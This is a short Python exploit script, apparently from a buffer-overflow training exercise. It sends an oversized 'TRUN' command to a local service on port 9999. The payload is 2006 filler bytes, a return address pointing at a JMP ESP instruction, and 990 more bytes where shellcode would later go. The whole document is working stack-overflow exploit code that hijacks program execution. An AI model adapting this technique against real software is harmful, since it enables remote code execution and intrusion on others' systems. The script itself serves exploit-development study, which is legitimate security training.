#!/usr/bin/python
import socket

buffstring='A' * 2006

# 625011AF   FFE4             JMP ESP
ret='\xaf\x11\x50\x62'

bufferbackfill='C' * 990	# [ 2006 ] [ ret (4 bytes)] [ 990 C's ] = 3000 chars



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
s.recv(50)
s.send('TRUN .' + buffstring + ret + bufferbackfill)
s.close()
